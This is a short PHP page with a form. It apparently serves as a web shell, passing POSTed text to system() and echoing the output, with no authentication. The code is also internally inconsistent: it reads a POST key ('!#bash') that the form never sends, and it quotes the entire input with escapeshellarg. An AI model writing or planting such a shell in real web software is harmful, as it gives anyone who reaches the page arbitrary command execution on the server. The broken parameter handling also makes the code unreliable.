<?php
if ($_SERVER["REQUEST_METHOD"] === 'POST') {

  $terminal = escapeshellarg($_POST["!#bash"]);

  var_dump($terminal);

  echo "<pre>";

  $command = system($terminal, $return);

  echo "</pre>";
}

 ?>
<form  method="post">

  <input type="text" name="terminal">
  <button type="submit">SEND!</button>

</form>
